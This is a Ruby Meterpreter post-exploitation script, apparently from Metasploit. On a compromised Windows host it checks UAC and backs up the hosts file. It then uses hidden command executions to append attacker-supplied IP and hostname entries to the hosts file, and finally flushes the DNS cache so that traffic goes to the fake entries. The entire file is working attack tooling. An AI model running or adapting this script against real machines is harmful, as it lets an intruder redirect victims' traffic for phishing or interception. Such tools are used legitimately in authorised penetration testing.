# Meterpreter script for modifying the hosts file in windows
# given a single entrie or several in a file and clear the
# DNS cache on the target machine.
# This script works with Windows 2000,Windows XP,Windows 2003,
# Windows Vista and Windows 2008.
# Provided: carlos_perez[at]darkoperator[dot]com
# Version: 0.1.0
# Note: in Vista UAC must be disabled to be able to perform hosts
# file modifications.
################## Variable Declarations ##################
session = client
# Setting Arguments
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help Options." ],
  "-e" => [ true,  "Host entry in the format of IP,Hostname." ],
  "-l" => [ true,  "Text file with list of entries in the format of IP,Hostname. One per line." ]
)
def usage
  print_line("This Meterpreter script is for adding entries in to the Windows Hosts file.")
  print_line("Since Windows will check first the Hosts file instead of the configured DNS Server")
  print_line("it will assist in diverting traffic to the fake entry or entries. Either a single")
  print_line("entry can be provided or a series of entries provided a file with one per line.")
  print_line(@@exec_opts.usage)
  print_line("Example:\n\n")
  print_line("run hostsedit -e 127.0.0.1,google.com\n")
  print_line("run hostsedit -l /tmp/fakednsentries.txt\n\n")
  raise Rex::Script::Completed
end


record = ""
#Set path to the hosts file
hosts = session.fs.file.expand_path("%SYSTEMROOT%")+"\\System32\\drivers\\etc\\hosts"
#Function check if UAC is enabled
def checkuac(session)
  winver = session.sys.config.sysinfo
  if winver["OS"] =~ (/Windows 7|Vista/)
    print_status("Checking if UAC is enabled.")
    open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", KEY_READ)
    value = open_key.query_value("EnableLUA").data
    if value == 1
      print_status("\tUAC is enabled")
      raise "Unable to continue UAC is enabbled."
    else
      print_status("\tUAC is disabled")
      status = false
    end
  end
end
#Function for adding record to hosts file
def add2hosts(session,record,hosts)
  ip,host = record.split(",")
  print_status("Adding Record for Host #{host} with IP #{ip}")
  session.sys.process.execute("cmd /c echo #{ip}\t#{host} >> #{hosts}",nil, {'Hidden' => true})
end

#Make a backup of the hosts file on the target
def backuphosts(session,hosts)
  random = sprintf("%.5d",rand(100000))
  print_status("Making Backup of the hosts file.")
  session.sys.process.execute("cmd /c copy #{hosts} #{hosts}#{random}.back",nil, {'Hidden' => true})
  print_status("Backup loacated in #{hosts}#{random}.back")
end
# Clear DNS Cached entries
def cleardnscach(session)
  print_status("Clearing the DNS Cache")
  session.sys.process.execute("cmd /c ipconfig /flushdns",nil, {'Hidden' => true})
end
if client.platform =~ /win32|win64/
  @@exec_opts.parse(args) { |opt, idx, val|
    case opt
    when "-e"
      checkuac(session)
      backuphosts(session,hosts)
      add2hosts(session,val,hosts)
      cleardnscach(session)
    when "-l"
      checkuac(session)
      if not ::File.exists?(val)
        raise "File #{val} does not exists!"
      else
        backuphosts(session,hosts)
        ::File.open(val, "r").each_line do |line|
          next if line.strip.length < 1
          next if line[0,1] == "#"
          add2hosts(session,line.chomp,hosts)
        end
        cleardnscach(session)
      end
    when "-h"
      usage
    end
  }
  if args.length == 0
    usage
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
